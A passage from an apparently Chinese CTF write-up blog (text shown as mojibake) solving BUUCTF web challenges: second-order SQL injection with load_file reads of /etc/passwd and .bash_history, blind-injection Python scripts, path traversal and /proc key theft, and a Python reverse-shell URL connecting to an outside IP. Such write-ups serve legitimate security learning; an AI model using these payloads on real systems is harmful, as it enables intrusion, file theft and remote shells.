2018]Comment</h2><p>éœ€è¦ç™»å½•æ‰èƒ½å‘å¸–</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.ç»™äº†è´¦å·å’Œå¯†ç å‰å‡ ä½ï¼Œç›´æ¥burpçˆ†ç ´</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>æˆåŠŸçˆ†ç ´å‡ºå¯†ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>æ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ³¨æ„ï¼Œç”±äºbuuå¾ˆå®¹æ˜“å´©æºƒï¼Œè¦é™ä½é€Ÿåº¦</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>å‘ç°gitæ³„éœ²,ä½¿ç”¨githackæ‰’å‡ºæºç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>ä½†æ˜¯è¿™æ®µä»£ç æ˜æ˜¾ä¸å®Œæ•´</p><p>ä½¿ç”¨(è¿™é‡Œæ¨èä½¿ç”¨linuxï¼Œæˆ‘ç”¨windowså‡ºç°äº†é”™è¯¯)</p><pre><code>git log --all</code></pre><p>æŸ¥ä¸€ä¸‹ä¹‹å‰æäº¤çš„ç‰ˆæœ¬</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>æ¢å¤åˆ°åˆå§‹ç‰ˆæœ¬</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>æˆåŠŸå¾—åˆ°å®Œæ•´æºç </p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>å¼€å§‹å®¡è®¡ä»£ç </p><p>å…ˆä»‹ç»ä¸‹addslasheså‡½æ•°</p><pre><code>addslashes() å‡½æ•°åœ¨æŒ‡å®šçš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ åæ–œæ ã€‚è¿™äº›å­—ç¬¦æ˜¯å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸NULï¼ˆNULLå­—ç¬¦ï¼‰ã€‚</code></pre><p>é€»è¾‘å…¶å®å¾ˆæ¸…æ™°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªé¡µé¢ï¼Œå–å‡ºè¿™ä¸ªé¡µé¢ä¸­categoryçš„å€¼ç„¶åæ¥å—contentçš„å€¼ï¼Œæ’å…¥åˆ°è¯¥é¡µé¢ã€‚ä½†æ˜¯é—®é¢˜å°±å‡ºåœ¨ï¼Œæ­¤ä»£ç åªå¯¹ç”¨æˆ·è¾“å…¥çš„å€¼åšäº†è½¬ä¹‰ï¼Œè€Œç»å¯¹ä¿¡ä»»ä»æœåŠ¡å™¨ä¸­å–å‡ºçš„å€¼ï¼Œè¿™å°±å¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•é—­åˆsqlè¯­å¥ï¼Œä½¿å…¶å¯ä»¥æ‰§è¡Œæˆ‘ä»¬æ¶æ„çš„sqlè¯­å¥ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦å¯¹å‘å¸–å¤„çš„categoriesåšç‰¹æ®Šè¾“å…¥</p><pre><code>0&#39;,content = database(), /*</code></pre><p>ç„¶ååœ¨ç•™è¨€å¤„è¾“å…¥</p><pre><code>*/#</code></pre><p>è¿™æ—¶å€™çš„sqlè¯­å¥å°±å˜ä¸º</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>ç®€åŒ–å</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>è¿™æ ·é€šè¿‡åœ¨categoryæ„é€ ï¼Œå¯ä»¥æŠŠcontentæ›¿æ¢æˆæˆ‘ä»¬æƒ³è¦çš„è¯­å¥</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ‰§è¡Œæ•ˆæœ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>æˆåŠŸçˆ†å‡ºäº†æ•°æ®åº“</p><p>æŸ¥çœ‹ä¸€ä¸‹æƒé™</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>æœ€é«˜æƒé™ï¼Œå¯ä»¥å°è¯•load_file()è¯»å–æ–‡ä»¶</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>æˆ‘ä»¬å‘ç°wwwç”¨æˆ·(ä¸€èˆ¬å’Œç½‘ç«™æ“ä½œç›¸å…³çš„ç”¨æˆ·ï¼Œç”±ä¸­é—´ä»¶åˆ›å»º)åœ¨/home/wwwç›®å½•,è¯»å–è¿™ä¸‹é¢çš„.bash_historyæ–‡ä»¶</p><pre><code>æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè§£å‹äº†ä¸€ä¸ªhtml.zipï¼Œåˆ é™¤html.zip,ç„¶åæ•´ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶åˆ°/var/www/htmlé‡Œï¼Œç„¶ååˆ é™¤.DS_Store</p><pre><code>.DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</code></pre><p>å®ƒè¿˜æœ‰ä¸€ä»½å­˜åœ¨äºåœ¨/tmp//html/ç›®å½•ä¸­ï¼Œæ„é€ sqlè¯­å¥è¿›è¡Œè¯»å–</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>è¿™é‡Œæ–‡ä»¶å¤ªå¤šï¼Œæ— æ³•å®Œå…¨æ˜¾ç¤ºï¼Œè¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>è§£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>å‘ç°å¯ç–‘æ–‡ä»¶</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>æ„é€ sqlè¯­å¥è¿›è¡Œè¯»å–</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œ/tmp/html/flag_8946e1ff1ee3e40f.phpçš„flagæ˜¯å‡flagï¼Œè¿˜æ˜¯è¦å½“å½“å‰è¿è¡Œçš„ç½‘ç«™ç›®å½•ä¸‹è¯»å–</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>è€ƒå¯Ÿsqlæ³¨å…¥</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>æœ‰wafï¼Œfuzzä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>å‘ç°å¾ˆå¤šå…³é”®è¯è¢«è¿‡æ»¤äº†</p><p>è€ƒè™‘ç›²æ³¨ï¼Œæµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>ç¡®è®¤äº†ç›²æ³¨çš„å­˜åœ¨</p><pre><code>ä¸ºä»€ä¹ˆåŠ ä¸Š||1=1åï¼Œå€¼ä¼šå˜ä¸ºNu1Låå‘¢ï¼Œè¿™é‡Œç‰µæ‰¯åˆ°è¿ç®—é¡ºåºï¼Œè¿™æ˜¯æˆ‘ä¹‹å‰ç™¾æ€ä¸å¾—å…¶è§£çš„ä¸€ç‚¹ï¼Œåé—¨æ‰æƒ³èµ·æ¥</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯”è¾ƒè¿ç®—çš„ä¼˜å…ˆçº§æ˜¯é«˜äºorçš„ï¼Œæ‰€ä»¥ä¼šå…ˆåˆ¤æ–­å³è¾¹çš„å€¼æ˜¯å¦ä¸ºçœŸï¼Œå¦‚æœä¸ºçœŸå°±ä¸ä¼šå†çœ‹å·¦è¾¹äº†ã€‚</p><p>æ€»ä¹‹æˆ‘ä»¬ç¡®å®šäº†è¦ä»ç›²æ³¨å…¥æ‰‹ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªå…³é”®ç‚¹ï¼Œé‚£å°±æ˜¯informationè¿™ä¸ªè¡¨è¢«ç¦ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä»å…¶ä»–è¡¨ä¸­è·å–æˆ‘ä»¬éœ€è¦çš„å†…å®¹ã€‚</p><p><strong>1.åˆ©ç”¨mysql5.7æ–°å¢çš„sys.schema_auto_increment_columns</strong></p><pre><code> è¿™æ˜¯sysæ•°æ®åº“ä¸‹çš„ä¸€ä¸ªè§†å›¾ï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªä¸information_schema,ä»–çš„ä½œç”¨æ˜¯å¯¹è¡¨çš„è‡ªå¢IDè¿›è¡Œç›‘æ§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸå¼ è¡¨å­˜åœ¨è‡ªå¢IDï¼Œå°±å¯ä»¥é€šè¿‡è¯¥è§†å›¾æ¥è·å–å…¶è¡¨åå’Œæ‰€åœ¨æ•°æ®åº“åä»¥ä¸‹ä¸ºè¯¥è§†å›¾çš„æ‰€æœ‰åˆ—</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> è¿™æ˜¯sysæ•°æ®åº“ä¸‹çš„è§†å›¾ï¼Œé‡Œé¢å­˜å‚¨ç€æ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨çš„ç»Ÿè®¡ä¿¡æ¯  ä¸å®ƒè¡¨ç»“æ„ç›¸ä¼¼çš„è§†å›¾è¿˜æœ‰  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_ioä»¥ä¸‹ä¸ºè¯¥è§†å›¾çš„å¸¸ç”¨åˆ—ï¼ˆå…¨éƒ¨åˆ—æœ‰å¾ˆå¤šå¾ˆå¤š)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysqlé»˜è®¤å­˜å‚¨å¼•æ“innoDBæºå¸¦çš„è¡¨</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  ä¸¤è¡¨å‡æœ‰database_nameå’Œtable_nameå­—æ®µï¼Œå¯ä»¥åˆ©ç”¨</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>ç›²æ³¨éœ€è¦ç”¨äºŒè¿›åˆ¶è·‘æ‰èƒ½æé«˜æ•ˆç‡ï¼Œè´´ä¸Šå†™çš„ç›²æ³¨è„šæœ¬ï¼Œæˆ‘å¤ªèœäº†å†™ä¸€ä¸ªè¦åŠå¤©æ—¶é—´</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>æœ€å¥½çš„åŠæ³•æ˜¯èƒŒä¸‹æ¥æ¨¡æ¿ï¼Œè¿™æ ·çœŸæ­£çš„æ¯”èµ›æ—¶æ‰èƒ½è¾ƒå¿«å†™é¢˜ã€‚</p><p>æœ€ç»ˆå¾—åˆ°ä¸¤ä¸ªè¡¨</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>æ¥ä¸‹æ¥å°±è¦ä»è¡¨ä¸­æ‹¿flag</p><p>ä¸‹é¢è¦ç”¨åˆ°<strong>æ— åˆ—åæ³¨å…¥</strong></p><p>ä¸ºä»€ä¹ˆè¦é‡‡ç”¨è¿™ä¸ªæ³¨å…¥å‘¢ï¼Œæ˜¯å› ä¸ºsys.schema_table_statistics_with_bufferä¸­åªæœ‰è¡¨çš„ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰åˆ—çš„ä¿¡æ¯ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨å¸¸è§„çš„æ–¹æ³•ã€‚</p><p>å…³äºæ— åˆ—åæ³¨å…¥ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>è¿™ä»£è¡¨å­—ç¬¦ä¸²çš„å¤§å°äºé•¿çŸ­æ— å…³ï¼Œè€Œä¸é¦–å­—æ¯(å¦‚æœé¦–å­—æ¯ç›¸åŒåˆ™ç»§ç»­å‘ä¸‹æ¯”å¤§å°)çš„asciiæœ‰å…³</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>ç”±è¿™ä¸ªæˆ‘ä»¬å°±èƒ½æ„é€ å‡ºpayload</p><p>å…ˆæ¥åˆ¤æ–­ä¸‹å­—æ®µ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>ç”±æ­¤å¯åˆ¤æ–­å­—æ®µä¸ºä¸¤ä¸ª</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>ä»£ç :</p><p>æš´åŠ›</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p><strong>éé¢„æœŸè§£</strong></p><p>è¿™é¢˜åšçš„å¾ˆå¥‡å¦™ï¼Œï¼Œï¼Œç›´æ¥éé¢„æœŸè§£äº†</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œæ‹–åˆ°010editorï¼Œflagç›´æ¥å‡ºç°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>é¢„æœŸè§£</strong></p><p>è¿˜æ˜¯å­¦ä¹ ä¸‹æ­£è§„æ€è·¯å§</p><p>é¦–å…ˆåº”è¯¥è¯»å–ä¸‹è¿›ç¨‹ä¿¡æ¯</p><pre><code>åœ¨/proc æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æ–‡ä»¶  ã€‚ä¸‹é¢æ˜¯/proc ç›®å½•ä¸‹çš„ä¸€äº›é‡è¦æ–‡ä»¶  ï¼š/proc/pid/cmdline  åŒ…å«äº†ç”¨äºå¼€å§‹è¿›ç¨‹çš„å‘½ä»¤  ï¼›/proc/pid/cwd åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥  ï¼›/proc/pid/environ  åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨  ï¼›/proc/pid/exe  åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥ï¼›/proc/pid/fd/  è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›/proc/pid/mem  åŒ…å«äº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›/proc/pid/stat åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼›/proc/pid/statm  åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯ã€‚ </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>å¯ä»¥çœ‹åˆ°åˆšå¼€å§‹æ‰§è¡Œäº†</p><pre><code>python2 app.py</code></pre><p>æˆ‘ä»¬æ¥è¯»å–ä¸‹app.pyçš„æºç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linuxé‡Œå¦‚æœæ²¡æœ‰å…³é—­æ–‡ä»¶ä¼šæ”¾åœ¨å†…å­˜é‡Œï¼Œå°±ç®—ä½ removeæ‰äº†<strong>åœ¨/proc/[pid]/fdä¸‹è¿˜æ˜¯ä¼šä¿å­˜</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>æ‰¾åˆ°äº†å¯†é’¥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>ç»“æœæ˜¯æ— å›æ˜¾rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>ä½¿ç”¨åå¼¹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" 